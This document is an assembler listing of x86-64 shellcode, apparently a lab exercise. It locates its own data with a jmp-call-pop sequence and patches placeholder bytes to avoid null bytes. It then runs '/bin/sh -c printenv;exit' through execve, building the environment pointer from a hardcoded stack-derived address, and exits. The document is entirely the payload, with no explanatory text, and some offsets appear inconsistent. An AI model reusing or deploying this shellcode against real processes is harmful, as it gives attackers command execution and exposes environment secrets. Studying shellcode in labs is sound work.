     1                                            bits 64
     2                                              ; find out where we are
     3 00000000 EB52                    start:     jmp short codeEnd
     4 00000002 5E                      start2:    pop rsi
     5                                  
     6                                              ; clear the a register
     7 00000003 4831C0                             xor rax,rax
     8                                  
     9                                              ; restore null bytes to data
    10 00000006 884607                             mov [rsi+flagStr-exeStr-2],al
    11 00000009 88460B                             mov [rsi+cmdStr-exeStr-1],al
    12 0000000C 884619                             mov [rsi+arrayAddr-exeStr-1],al
    13 0000000F 48894632                           mov [rsi+arrayAddr-exeStr+24],rax
    14                                  
    15                                  
    16                                            ; Move the values of exeStr, flagStr, and cmdStr into the array
    17 00000013 4889761A                          mov [rsi+arrayAddr-exeStr],rsi
    18 00000017 488D7E09                          lea rdi,[rsi+flagStr - exeStr]
    19 0000001B 48897E22                          mov [rsi+arrayAddr-exeStr+8],rdi
    20 0000001F 488D7E0C                          lea rdi,[rsi+cmdStr - exeStr]
    21 00000023 48897E1E                          mov [rsi+arrayAddr-cmdStr+16],rdi
    22                                  
    23                                              ; execve system call
    24 00000027 B03B                               mov al,0x3b
    25 00000029 4889F7                             mov rdi, rsi
    26 0000002C 488D761A                           lea rsi, [rsi+arrayAddr-exeStr]
    27                                             ;mov rdi,exeStr
    28                                             ;mov rsi,arrayAddr
    29                                             
    30                                              ; Restoring the array
    31 00000030 4889E2                             mov rdx,rsp
    32 00000033 48C1EA20                           shr rdx, 32
    33 00000037 48C1E220                           shl rdx, 32
    34 0000003B B9FFE67BFF                         mov rcx, 0xff7be6ff
    35 00000040 30C9                               xor cl, cl
    36 00000042 4809CA                             or  rdx,rcx
    37 00000045 488B12                             mov rdx, [rdx]
    38 00000048 0F05                               syscall
    39                                              ; exit system call 
    40 0000004A 4889C7                             mov rdi, rax
    41 0000004D 4831C0                             xor rax, rax
    42 00000050 B03C                               mov al, 0x3c
    43 00000052 0F05                               syscall
    44                                  
    45 00000054 E8A9FFFFFF              codeEnd:   call start2
    46                                              ; data
    47 00000059 2F62696E2F73685879      exeStr:    db "/bin/shXy"
    48 00000062 2D6358                  flagStr:   db "-cX"
    49 00000065 7072696E74656E763B-     cmdStr:    db "printenv;exitX"
    49 0000006E 6578697458         
    50 00000073 FFFFFFFFFFFFFFFF        arrayAddr: dq 0xffffffffffffffff ;exeStr
    51 0000007B FFFFFFFFFFFFFFFF                   dq 0xffffffffffffffff ;flagStr
    52 00000083 FFFFFFFFFFFFFFFF                   dq 0xffffffffffffffff ;cmdStr
    53 0000008B FFFFFFFFFFFFFFFF                   dq 0xffffffffffffffff
    54 00000093 93000000                newAddr:   dd newAddr-start
